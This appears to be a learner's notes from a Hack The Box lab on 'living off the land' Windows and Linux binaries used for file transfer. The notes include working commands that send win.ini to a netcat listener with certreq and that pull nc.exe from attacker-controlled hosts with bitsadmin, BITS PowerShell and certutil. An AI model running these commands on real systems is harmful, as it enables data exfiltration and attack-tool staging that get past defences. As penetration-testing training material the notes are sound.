 Living off the Land binaries:

- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)
  
  ## Using the LOLBAS and GTFOBins Project

[LOLBAS for Windows](https://lolbas-project.github.io/#) and [GTFOBins for Linux](https://gtfobins.github.io/) are websites where we can search for binaries we can use for different functions.

### LOLBAS

To search for download and upload functions in [LOLBAS](https://lolbas-project.github.io/) we can use `/download` or `/upload`.

Let's use [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) as an example.

#### Upload win.ini to our Pwnbox

```cmd-session
C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```
#### File Received in our Netcat Session

```shell-session
pepedavidphone@htb[/htb]$ sudo nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
Content-Length: 92
Host: 192.168.49.128:8000

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

### GTFOBins

To search for the download and upload function in [GTFOBins for Linux Binaries](https://gtfobins.github.io/), we can use `+file download` or `+file upload`.

Let's use [OpenSSL](https://www.openssl.org/). It's frequently installed and often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style."

We need to create a certificate and start a server in our Pwnbox.

#### Create Certificate in our Pwnbox

```shell-session
pepedavidphone@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

#### Stand up the Server in our Pwnbox

```shell-session
pepedavidphone@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

## Other Common Living off the Land tools

### Bitsadmin Download function

The [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) can be used to download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work.

#### File Download with Bitsadmin

```powershell-session
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.
#### Download

```powershell-session
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```
### Certutil

#### Download a File with Certutil
```cmd-session
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```